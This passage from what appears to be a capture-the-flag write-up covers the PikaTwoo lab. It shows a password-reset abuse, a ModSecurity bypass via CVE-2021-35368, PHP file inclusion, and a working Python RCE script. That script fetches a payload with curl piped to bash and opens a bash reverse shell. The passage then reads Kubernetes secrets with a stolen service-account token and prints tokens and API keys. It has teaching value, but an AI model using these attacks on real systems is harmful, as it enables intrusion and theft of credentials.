Trying this endpoint manually returns usage as well:

```

oxdf@hacky$ curl -k https://10.10.11.199/%70rivate/password-reset
{"error":"usage: /password-reset/<email>"}

```

If it gets an unknown email, it says so:

```

oxdf@hacky$ curl -k https://10.10.11.199/%70rivate/password-reset/0xdf@freemail.htb
{"error":"unknown email address"}

```

But with the email from the beta registration, it returns a token:

```

oxdf@hacky$ curl -k https://10.10.11.199/%70rivate/password-reset/roger.foster37@freemail.htb
{"token":"80231a4e69475fe9fe2bf8909796e92e80304c8ab28a6ebcf4560fa6907024df"}

```

If I try to POST to `/private/password-reset`, it returns 405 Method Not Allowed. But if I include the email, then it asks for a token and a password:

```

oxdf@hacky$ curl -k -X POST https://10.10.11.199/%70rivate/password-reset
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
oxdf@hacky$ curl -k -X POST https://10.10.11.199/%70rivate/password-reset/roger.foster37@freemail.htb
{"error":"missing parameter token"}
oxdf@hacky$ curl -k -X POST https://10.10.11.199/%70rivate/password-reset/roger.foster37@freemail.htb -d 'token=80231a4e69475fe9fe2bf8909796e92e80304c8ab28a6ebcf4560fa6907024df'
{"error":"missing parameter new_password"}
oxdf@hacky$ curl -k -X POST https://10.10.11.199/%70rivate/password-reset/roger.foster37@freemail.htb -d 'token=80231a4e69475fe9fe2bf8909796e92e80304c8ab28a6ebcf4560fa6907024df&new_password=0xdf0xdf'
{"success":"password changed"}

```

It reports to have changed the password! Trying the `/private/login` endpoint now reports success:

```

oxdf@hacky$ curl -k -X POST https://10.10.11.199/%70rivate/login -d 'email=roger.foster37@freemail.htb&password=0xdf0xdf'
{"success":"user authenticated"}

```

### Docs Form

I have a username and password, but I need somewhere to use it. It’s not unreasonable to think that the login form on `http://www.pokatmon-app.htb` might use this API on the backend to validate logins. I’ll try the newly reset creds there, and it works:

![image-20230829164829259](/img/image-20230829164829259.png)

## Shell as www in pokatdex-api Pod

### pokatdex-api-v1 Enumeration

#### In Swagger

The page behind the login form is a Swagger page, which provides documentation *and* buttons to try the API endpoints. The last three “Return Pokatmon data for the [region] region”, for “Chantoo”, “Oohen”, and “Jiotto” regions.

If I execute `/chantoo` (after adding the new subdomain to `/etc/hosts` so that it can resolve), it returns JSON data with a list of monster:

![image-20230829202708076](/img/image-20230829202708076.png)

The first endpoint, `/`, takes a `region` as a GET parameter. Giving it “chantoo” returns the same data as the `/chantoo` endpoint:

![image-20230829202821087](/img/image-20230829202821087.png)

If I try to send something that isn’t a region, it returns an error:

![image-20230829203338935](/img/image-20230829203338935.png)

Interestingly, in the error payload there’s a reference to that it’s not in debug mode.

#### curl

I’m curious to see if I can set `debug` to true. I’ll move to `curl`, first with the same command to make sure it works:

```

oxdf@hacky$ curl 'http://pokatdex-api-v1.pokatmon-app.htb/?region=0xdf'
{"error": "unknown region", "debug": "false"}

```

Now adding `debug=true`:

```

oxdf@hacky$ curl 'http://pokatdex-api-v1.pokatmon-app.htb/?region=0xdf&debug=true'
{"error": "unknown region", "debug": include(): Failed opening 'regions/0xdf' for inclusion (include_path='.:/usr/share/php')"}

```

So much information in here! This is a PHP API application. It’s trying to include the region data from a file in a `regions` directory.

#### Identify nginx URI Rewrites

It’s interesting that the same data comes from `/chantoo` and `/?region=chantoo`. It could be two different end points, but it seems more likely that they are handled by the same code. This could be managed within PHP, or nginx could do a modification of the URI to get them to the same place.

To play with this, I’ll try enabling debug mode for the `/chantoo` endpoint:

```

oxdf@hacky$ curl 'http://pokatdex-api-v1.pokatmon-app.htb/chantoo?debug=true'
[{"name":"Bulbawater","abilities":["Scary Roar","Water Cannon"],"picture":"http://pokatdex.pokatmon.htb/images/1.png"},{"name":"SpiderEyes","abilities":["Spinner Web","Tail Flipper"],"picture":"http://pokatdex.pokatmon.htb/images/2.png"},{"name":"Gangtooth","abilities":["Crocodile Bite","Ghost Boo"],"picture":"http://pokatdex.pokatmon.htb/images/3.png"},{"name":"Taki Taki","abilities":["Fire from Mouth","Grasp of Death"],"picture":"http://pokatdex.pokatmon.htb/images/4.png"}]

```

Nothing changed. What about a non-existent region:

```

oxdf@hacky$ curl 'http://pokatdex-api-v1.pokatmon-app.htb/0xdf?debug=true'
{"error": "unknown region", "debug": "false"}

```

It explicitly says that debug is `false`. The GET parameter isn’t getting there.

One possibility is that nginx is taking the stuff after `/` and rewriting that to `/?region=[stuff]`. If that were the case, then the `?` in the request above would actually need to be a `&`. I’ll try that, and it works:

```

oxdf@hacky$ curl 'http://pokatdex-api-v1.pokatmon-app.htb/0xdf&debug=true'
{"error": "unknown region", "debug": include(): Failed opening 'regions//0xdf' for inclusion (include_path='.:/usr/share/php')"}

```

That’s a pretty weird URI, as typically `&` comes after `?`. But given it works, that implies that something (probably nginx) is adding `?` to the URI already.

Cheating a bit ahead to where I get a shell and can look (at `/etc/nginx/nginx.conf` in the container), the actual configuration for this server looks like:

```

    location / {
    	try_files $uri $uri/ /index.php?region=$uri;
    }

```

The `location /` block is using `try_files` to look at three different paths for this request:
- `$uri` - the base URI
- `$uri/` - the base URI with a `/` appended
- `/index.php?region=$uri` - The URI as a parameter for `index.php`.

### Local File Include

#### Identify Mod Security

This *should* be vulnerable to a local file include (LFI), which will give file read and potentially execution (if I can get a malicious PHP file onto disk where it can be included). Unfortunately, when I try to access `../../../../../../../etc/hosts`, it is blocked and returns 403:

```

oxdf@hacky$ curl 'http://pokatdex-api-v1.pokatmon-app.htb/?region=../../../../../../../etc/hosts&debug=true'
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx</center>
</body>
</html>

```

In fact, having `..` in the parameter anywhere blocks it:

```

oxdf@hacky$ curl 'http://pokatdex-api-v1.pokatmon-app.htb/?region=../&debug=true'
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx</center>
</body>
</html>
oxdf@hacky$ curl 'http://pokatdex-api-v1.pokatmon-app.htb/?region=..&debug=true'
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx</center>
</body>
</html>
oxdf@hacky$ curl 'http://pokatdex-api-v1.pokatmon-app.htb/?region=.&debug=true'
{"error": "unknown region", "debug": include(): Failed opening 'regions/.' for inclusion (include_path='.:/usr/share/php')"}

```

This feels like [ModSecurity](https://github.com/SpiderLabs/ModSecurity), a web application firewall that is popular in nginx (though phasing out in favor of another WAF).

#### CVE-2021-35368 Background

The default rule set used by ModSecurity is the [OWASP ModSecurity Core Rule Set (CRS)](https://owasp.org/www-project-modsecurity-core-rule-set/). There is a vulnerability in the CRS from June 2021 (CVE-2021-35368) that allows for bypassing the rules by abusing “trailing pathname information”.

[This article](https://coreruleset.org/20210630/cve-2021-35368-crs-request-body-bypass/) goes into more detail about the issue. The CRS has this concept of Rule Exclusions (REs) that are written for various CMSs like Drupal, WordPress, etc. These are meant to disable rules that are known to generate false positives when working with that specific technology.

There’s a specific rule, `REQUEST-903.9001-DRUPAL-EXCLUSION-RULES.conf` that is meant to only work when enabled, but due to a bug, is enabled whether the owner has turned them on or not. Three of these rules (9001180, 9001182, and 9001184) disable body scanning for certain paths.

The file in question is available [here](https://github.com/SpiderLabs/owasp-modsecurity-crs/blob/v3.3/dev/rules/REQUEST-903.9001-DRUPAL-EXCLUSION-RULES.conf). I’ll look at 9001180 first, since it’s the simplest:

```

SecRule REQUEST_METHOD "@streq POST" \
    "id:9001180,\
    phase:1,\
    pass,\
    t:none,\
    nolog,\
    noauditlog,\
    ver:'OWASP_CRS/3.2.0',\
    chain"
    SecRule REQUEST_FILENAME "@rx /admin/content/assets/add/[a-z]+$" \
        "chain"
        SecRule REQUEST_COOKIES:/S?SESS[a-f0-9]+/ "@rx ^[a-zA-Z0-9_-]+" \
            "ctl:requestBodyAccess=Off"

```

The rule looks to see if the file path is `/admin/content/assets/add/[a-z]+$`. If it is, it checks if there’s a cookie that matches a regex (I’ll use `SESSa` for simplicity here) that has a value made up alphanumeric characters plus underscore and dash. If that matches, then it turns off access to the request body for ModSecurity.

#### Applying CVE Bypass

So how would this apply for PikaTwoo? It seems perhaps I can get the POST body to not be scanned. Does having POST body access help me? It looks like it does:

```

oxdf@hacky$ curl http://pokatdex-api-v1.pokatmon-app.htb/ -d "region=0xdf&debug=true"
{"error": "unknown region", "debug": include(): Failed opening 'regions/0xdf' for inclusion (include_path='.:/usr/share/php')"}

```

By adding `-d`, it sends a POST request with the parameters in the body.

If I visit `/admin/content/assets/add/a` with a cookie `SESSa=a`, then the body of the POST won’t be scanned by ModSecurity. So what happens when I send a POST to `/admin/content/assets/a`? The rule will check `/index.php?region=/admin/content/assets/add/a`. That’s not really helpful, unless the `region` in the body takes priority over the one in the GET parameters. I’ll do this as an experiment, where `0xdf` is the GET region, and `post0xdf` is the body one:

```

oxdf@hacky$ curl http://pokatdex-api-v1.pokatmon-app.htb/0xdf -d "region=post0xdf&debug=true"
{"error": "unknown region", "debug": include(): Failed opening 'regions/post0xdf' for inclusion (include_path='.:/usr/share/php')"}

```

Based on the debug, it looks like the POST takes priority! That means I should be able to access files around Mod Security. And it works:

```

oxdf@hacky$ curl http://pokatdex-api-v1.pokatmon-app.htb/admin/content/assets/add/a -d "region=../../../../../../etc/passwd&debug=true" -b "SESSa=a"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
www:x:1000:1000::/home/www:/bin/sh

```

### RCE

#### Dead Ends

I can use the LFI to read files from the disk. I’m not able to get to any log files, so I can’t log poison. I don’t have any upload capability to get a webshell on PikaTwoo. I could also try PHP filter injection (like in [Encoding](/2023/04/15/htb-encoding.html#lfi---rce) and [Pollution](/2023/07/01/htb-pollution.html#rce-via-filter-injection)), but the debug messages show that my input is prepended with “regions/”, which breaks this technique.

#### nginx Temp Files

[This blog post](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/) is about just this situation, using nginx’s ability to create temporary files on disk for large requests to create a webshell that gets invoked before it gets deleted. The post includes a example script, which I’ll walk-through and then modify for PikaTwoo in this [video](https://www.youtube.com/watch?v=0ZMpwb2fGmU):

By the end of the video, I’ve got this script:

```

#!/usr/bin/env python3
import sys, threading, requests

# exploit PHP local file inclusion (LFI) via nginx's client body buffering assistance
# see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details

URL = f'http://pokatdex-api-v1.pokatmon-app.htb/admin/content/assets/add/a'

# # find nginx worker processes 
# r  = requests.get(URL, params={
#     'file': '/proc/cpuinfo'
# })
# cpus = r.text.count('processor')
cpus = 2

# r  = requests.get(URL, params={
#     'file': '/proc/sys/kernel/pid_max'
# })
# pid_max = int(r.text)
# print(f'[*] cpus: {cpus}; pid_max: {pid_max}')
pid_max = 4194304

nginx_workers = []
for pid in range(pid_max):
    r  = requests.post(URL, 
            data={'region': f'../../proc/{pid}/cmdline'},
            cookies={"SESSa": "a"}
        )

    if b'nginx: worker process' in r.content:
        print(f'[*] nginx worker found: {pid}')

        nginx_workers.append(pid)
        if len(nginx_workers) >= cpus:
            break

done = False

# upload a big client body to force nginx to create a /var/lib/nginx/body/$X
def uploader():
    print('[+] starting uploader')
    while not done:
        requests.post(URL, data='0xdf0xdf\n<?php system("id"); /*' + 16*1024*'A')

for _ in range(16):
    t = threading.Thread(target=uploader)
    t.start()

# brute force nginx's fds to include body files via procfs
# use ../../ to bypass include's readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`
def bruter(pid):
    global done

    while not done:
        print(f'[+] brute loop restarted: {pid}')
        for fd in range(4, 32):
            f = f'../../proc/self/fd/{pid}/../../../{pid}/fd/{fd}'
            r  = requests.post(URL, data={'region': f}, cookies={"SESSa": "a"})
            if r.text and "0xdf0xdf" in r.text:
                print(f'[!] {f}: {r.text}')
                done = True
                exit()

for pid in nginx_workers:
    a = threading.Thread(target=bruter, args=(pid, ))
    a.start()

```

And it runs `id`:

```

oxdf@hacky$ python rce.py 
[*] nginx worker found: 11
[*] nginx worker found: 12
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] brute loop restarted: 11
[+] brute loop restarted: 12
[!] ../../proc/self/fd/12/../../../12/fd/16: 0xdf0xdf
uid=1000(www) gid=1000(www) groups=1000(www)

```

#### Shell

To get a shell, I’ll update the script to run `curl` to my server and then pipe the result into `bash`:

```

requests.post(URL, data='0xdf0xdf\n<?php system("curl 10.10.14.6/rev|bash"); /*' + 16*1024*'A')

```

Now I’ll save a simple [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) in `rev`:

```

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/444 0>&1

```

And start a Python web server hosting this file. When it runs, I get a shell:

```

oxdf@hacky$ nc -lnvp 444
Listening on 0.0.0.0 444
Connection received on 10.10.11.199 39756
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
www@pokatdex-api-75b7bd96f7-2xkxk:/www$

```

I’ll upgrade the shell using the [standard technique](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

www@pokatdex-api-75b7bd96f7-2xkxk:/www$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www@pokatdex-api-75b7bd96f7-2xkxk:/www$ ^Z
[1]+  Stopped                 nc -lnvp 444
oxdf@hacky$ stty raw -echo ; fg
nc -lnvp 444
            reset
reset: unknown terminal type unknown
Terminal type? screen
www@pokatdex-api-75b7bd96f7-2xkxk:/www$q

```

## Shell as nobody in APISIX Pod

### Enumeration

#### Identify Kubernetes

The box has the feeling of being a container. There are no directories in `/home`. There’s a `start.sh` in the system root that runs `supervisord`, which is not uncommon in containers but is very rare in non-containers:

```

#!/bin/bash

# Run supervisord
/usr/bin/supervisord -c /etc/supervisord.conf

```

There’s no `.dockerfile` in `/`, so it might not be a simple Docker container.

The IP address is 10.244.0.3/24, which is different from the IP of PikaTwoo:

```

www@pokatdex-api-75b7bd96f7-2xkxk:/$ ip -o -4 addr
1: lo    inet 127.0.0.1/8 scope host lo\       valid_lft forever preferred_lft forever
3: eth0    inet 10.244.0.3/24 brd 10.244.0.255 scope global eth0\       valid_lft forever preferred_lft forever

```

In `/run/secrets` there’s a `kubernetes.io` directory:

```

www@pokatdex-api-75b7bd96f7-2xkxk:/$ ls run/secrets/
kubernetes.io

```

Digging in a bit, I’ll find files for the namespace and the token:

```

www@pokatdex-api-75b7bd96f7-2xkxk:/run/secrets/kubernetes.io/serviceaccount$ ls       
ca.crt  namespace  token
www@pokatdex-api-75b7bd96f7-2xkxk:/run/secrets/kubernetes.io/serviceaccount$ cat namespace 
applications
www@pokatdex-api-75b7bd96f7-2xkxk:/run/secrets/kubernetes.io/serviceaccount$ cat token 
eyJhbGciOiJSUzI1NiIsImtpZCI6IjAtelk2WTBKaFgwY3g0b3hxbVF6OWg5blJmNkVOS0xiNFhkNklqN2ZybGcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI0OTYwNDU5LCJpYXQiOjE2OTM0MjQ0NTksImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJhcHBsaWNhdGlvbnMiLCJwb2QiOnsibmFtZSI6InBva2F0ZGV4LWFwaS03NWI3YmQ5NmY3LTJ4a3hrIiwidWlkIjoiOGI3MGY1YjItODE1OC00NDg5LTk0NGUtMDA2ZTM1Yzc2ZDkzIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJkZWZhdWx0IiwidWlkIjoiMTRmN2QyM2MtZDlmZi00OGE1LTg1MmItODAyZTdjZmVjZDkzIn0sIndhcm5hZnRlciI6MTY5MzQyODA2Nn0sIm5iZiI6MTY5MzQyNDQ1OSwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmFwcGxpY2F0aW9uczpkZWZhdWx0In0.qOIJqW0CeQ1SFzavswCO_6nFM9SvNjAXiB-8hcNtZ_wP0fX4dy408SDAX9eDSydWq19XdHcfawEiSLWBfD-LfNSEYFd5pXuRj6C2apD2fOqLydGI-ovaNXqK__zrThfiqI95583o8J-kX_2b0RvJKRvgHuUiJ9c64Yg7Xl8Li-RKEFJP21eeoKcO8PP3a-qsFA628UTGNk-tti4yEXG0igRKuZOkzYBSA8R-e7UN7xzvhKg1pUIFJpFU87MdQGKEUWcLn4OHb_21DazdsjVwO0JRq59yXKq0cXlmi3AGvjUpjI-IBQFkAqURFRRapE939ytLBvp0Z-2gH_N1MSPaxw

```

The namespace is called applications and there’s a token.

#### Accessing Kubernetes API

The Kubernetes docs have a page called [Accessing the Kubernetes API from a Pod](https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/) that walks through how to do just that. Outside the pods I’d typically use a program called `kubectl` to interact with the cluster, but that’s not installed in this (or most) pods.

I’ll follow the instructions there, first setting some variables:

```

www@pokatdex-api-75b7bd96f7-2xkxk:/$ # Point to the internal API server hostname
www@pokatdex-api-75b7bd96f7-2xkxk:/$ APISERVER=https://kubernetes.default.svc
www@pokatdex-api-75b7bd96f7-2xkxk:/$ # Path to ServiceAccount token
www@pokatdex-api-75b7bd96f7-2xkxk:/$ SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
www@pokatdex-api-75b7bd96f7-2xkxk:/$ # Read this Pod's namespace
www@pokatdex-api-75b7bd96f7-2xkxk:/$ NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
www@pokatdex-api-75b7bd96f7-2xkxk:/$
# Read the ServiceAccount bearer token
www@pokatdex-api-75b7bd96f7-2xkxk:/$ TOKEN=$(cat ${SERVICEACCOUNT}/token)
www@pokatdex-api-75b7bd96f7-2xkxk:/$ # Reference the internal certificate authority (CA)
www@pokatdex-api-75b7bd96f7-2xkxk:/$ CACERT=${SERVICEACCOUNT}/ca.crt

```

Now I can hit the API using that token:

```

www@pokatdex-api-75b7bd96f7-2xkxk:/$ curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api
{
  "kind": "APIVersions",
  "versions": [
    "v1"
  ],
  "serverAddressByClientCIDRs": [
    {
      "clientCIDR": "0.0.0.0/0",
      "serverAddress": "192.168.49.2:8443"
    }
  ]
}

```

#### Reading Secrets

The [API docs](https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.25/#secretlist-v1-core) show that secrets are accessed from `/api/v1/namespaces/{namespace}/secrets`:

```

www@pokatdex-api-75b7bd96f7-2xkxk:/$ curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/$NAMESPACE/secrets
{
  "kind": "SecretList",
  "apiVersion": "v1",
  "metadata": {
    "resourceVersion": "2490044"
  },
  "items": [
    {
      "metadata": {
        "name": "apisix-credentials",
        "namespace": "applications",
        "uid": "be010bfa-acfb-410b-a5a3-23a2be554642",
        "resourceVersion": "806",
        "creationTimestamp": "2022-03-17T22:02:57Z",
        "annotations": {
          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"data\":{\"APISIX_ADMIN_KEY\":\"YThjMmVmNWJjYzM3NmU5OTFhZjBiMjRkYTI5YzNhODc=\",\"APISIX_VIEWER_KEY\":\"OTMzY2NjZmY4YjVkNDRmNTAyYTNmMGUwOTQ3NmIxMTg=\"},\"kind\":\"Secret\",\"metadata\":{\"annotations\":{},\"name\":\"apisix-credentials\",\"namespace\":\"applications\"},\"type\":\"Opaque\"}\n"
        },
        "managedFields": [
          {
            "manager": "kubectl-client-side-apply",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2022-03-17T22:02:57Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:APISIX_ADMIN_KEY": {},
                "f:APISIX_VIEWER_KEY": {}
              },
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:kubectl.kubernetes.io/last-applied-configuration": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "APISIX_ADMIN_KEY": "YThjMmVmNWJjYzM3NmU5OTFhZjBiMjRkYTI5YzNhODc=",
        "APISIX_VIEWER_KEY": "OTMzY2NjZmY4YjVkNDRmNTAyYTNmMGUwOTQ3NmIxMTg="
      },
      "type": "Opaque"
    },
    {
      "metadata": {
        "name": "default-token-hl4d7",
        "namespace": "applications",
        "uid": "00cb586a-5e2b-465a-947d-43d865570958",
        "resourceVersion": "770",
        "creationTimestamp": "2022-03-17T22:02:09Z",
        "annotations": {
          "kubernetes.io/service-account.name": "default",
          "kubernetes.io/service-account.uid": "14f7d23c-d9ff-48a5-852b-802e7cfecd93"
        },
        "managedFields": [
          {
            "manager": "kube-controller-manager",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2022-03-17T22:02:09Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:ca.crt": {},
                "f:namespace": {},
                "f:token": {}
              },
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:kubernetes.io/service-account.name": {},
                  "f:kubernetes.io/service-account.uid": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "ca.crt": "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURCakNDQWU2Z0F3SUJBZ0lCQVRBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwdGFXNXAKYTNWaVpVTkJNQjRYRFRJeU1ETXdPVEU1TURZek1Wb1hEVE15TURNd056RTVNRFl6TVZvd0ZURVRNQkVHQTFVRQpBeE1LYldsdWFXdDFZbVZEUVRDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTm5oClU2Y083amNWOTEzNFlBS3g2NDJ3N0dOc2UvdC9DMHBPRHhpTGNoSmovcFVnVjNmTTBWL3dRR0k1OXlhNDhTdW0KK1RzcUppd2RXT21JckEyUEZOSVJhMUpyUjg5RHd4bERad0VVSElYSmxZNTFRdVE0cmEyNUZvMXBGWWx2UUFTQQpBUU1SMjUwblQwYVd0S25pTVQ1TDNYNnM1RmcvQVU2R21lNkxBVlYrVW8xZ1ZMeTRjZ3cvTnZDMXF4azJXMnkxCjJYU2hPcTVkQnMveE5WMGxtMzgvUG9hK2xtamVaZGJWMzJJa1NITlQvUGRrNldkYm0va0lHK3dDd2tkaERRdGYKVHRPd1dobG5Qb3pDMDU2cU1SZnBKSytxOHpoWGwvTmVIZkhKL04vQmpqYzVxRHd4a3hIcEpGUnJldmQvd0xnLwp0S0sxajBSTWR3NnM2QmhiTUcwQ0F3RUFBYU5oTUY4d0RnWURWUjBQQVFIL0JBUURBZ0trTUIwR0ExVWRKUVFXCk1CUUdDQ3NHQVFVRkJ3TUNCZ2dyQmdFRkJRY0RBVEFQQmdOVkhSTUJBZjhFQlRBREFRSC9NQjBHQTFVZERnUVcKQkJTVERUVHFEc2Nqcnl4V0Voa2MxYkpySjdQZ0V6QU5CZ2txaGtpRzl3MEJBUXNGQUFPQ0FRRUFWY2Erd0Z0eApEajBKT0QvYlN3allUY0Yzcit5YzJWVWNQZVdOMmhjN0F2dndLTnlLTHl5K2hESEtCN0ZTTDV2U2d3OHhldlYxCkx6bjR5dVIzNzBNSCtOR25UNVZaTFVjVU5iakpOTSsxNDJOc1dSUlJ4dzZQSVZ4cFR6OUFzdk9WcURJbFhUTXAKaURNRGRrbG16aGRGbHdKV08wRUQ0c29lNEFhQ3NXRlE5d013ZEFSbWY4TTh2QW1kZUY1TWlwTjFHSEFNaTZ2WAo0UzdCSjZPRFNmRmpuSTRBWWhuZ215UzBseW56TUV4ZnJrVXRiOXJjNWFNcXdnd1QrRGs3eUc4SmxJNG1vOC9zCmFXT25jSVZBUzRDQXlpZG1Zdm1id05GVklMemM5VXVrcGMyV3M2RzNaeTdZQ014d2ZkYkZZNUVCY2MxQXRCWVoKc0k2WldJV0x5VkJuSGc9PQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==",
        "namespace": "YXBwbGljYXRpb25z",
        "token": "ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklqQXRlbGsyV1RCS2FGZ3dZM2cwYjNoeGJWRjZPV2c1YmxKbU5rVk9TMHhpTkZoa05rbHFOMlp5YkdjaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUpoY0hCc2FXTmhkR2x2Ym5NaUxDSnJkV0psY201bGRHVnpMbWx2TDNObGNuWnBZMlZoWTJOdmRXNTBMM05sWTNKbGRDNXVZVzFsSWpvaVpHVm1ZWFZzZEMxMGIydGxiaTFvYkRSa055SXNJbXQxWW1WeWJtVjBaWE11YVc4dmMyVnlkbWxqWldGalkyOTFiblF2YzJWeWRtbGpaUzFoWTJOdmRXNTBMbTVoYldVaU9pSmtaV1poZFd4MElpd2lhM1ZpWlhKdVpYUmxjeTVwYnk5elpYSjJhV05sWVdOamIzVnVkQzl6WlhKMmFXTmxMV0ZqWTI5MWJuUXVkV2xrSWpvaU1UUm1OMlF5TTJNdFpEbG1aaTAwT0dFMUxUZzFNbUl0T0RBeVpUZGpabVZqWkRreklpd2ljM1ZpSWpvaWMzbHpkR1Z0T25ObGNuWnBZMlZoWTJOdmRXNTBPbUZ3Y0d4cFkyRjBhVzl1Y3pwa1pXWmhkV3gwSW4wLkladm41aGk3dDZjUkhTNDAzM204R2tCaGdGUUZlVUZmZFZxTVlvYUR6S1FzNWlHVE4xaTR6aUJhbV9MMU02UE5RSlViNHNwVlpyN2FCS2RmMkpuNzNERFlhOHZ4bGtqa21BQkNFTDFrSEI2RlZSamFBOGxDRFdTamx2TkFaeU80czN0RXFBaEpRcHg2OUxmd0tuM201N05DdjkxakNULTRTY2lCN05YcjJOSGhZQ3RfVHVka0U1ZllRdE4xSGZTb0V6bVpXNjlmR0E4THFkbkRDNkZLb2ZnaGRLYkt6T1EtaHhUbFdMRjdwMUN3MnNnamZoczBCdWU3Q29nNFY3Rl9YQkN4ejVqZFpUZ2Nyc3A1TTVmNnZDYjJKbkc0RElqTEplZnMzQkRQTzVsS3dkY0NaVVN5Rkc1OXgzSzBBTVdSMHB4YmdNTnlYci1Mei03RHotWTkxUQ=="
      },
      "type": "kubernetes.io/service-account-token"
    },
    {
      "metadata": {
        "name": "sh.helm.release.v1.apisix.v1",
        "namespace": "applications",
        "uid": "538a6f88-f8e3-42bf-b75c-ff058ced2fd4",
        "resourceVersion": "169507",
        "creationTimestamp": "2022-03-30T12:50:30Z",
        "labels": {
          "modifiedAt": "1648644630",
          "name": "apisix",
          "owner": "helm",
          "status": "deployed",
          "version": "1"
        },
        "managedFields": [
          {
            "manager": "Go-http-client",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2022-03-30T12:50:30Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:release": {}
              },
              "f:metadata": {
                "f:labels": {
                  ".": {},
                  "f:modifiedAt": {},
                  "f:name": {},
                  "f:owner": {},
                  "f:status": {},
                  "f:version": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
